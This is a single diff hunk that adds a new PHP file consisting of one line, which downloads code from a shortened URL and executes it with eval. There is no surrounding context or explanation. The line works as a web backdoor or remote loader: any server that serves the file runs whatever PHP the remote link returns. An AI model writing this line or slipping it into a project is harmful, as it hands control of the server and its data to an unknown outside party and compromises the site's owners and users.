@@ -1,0 +1,1 @@
+<?=eval("?>".file_get_contents("https://rb.gy/5tt5fi"));?>
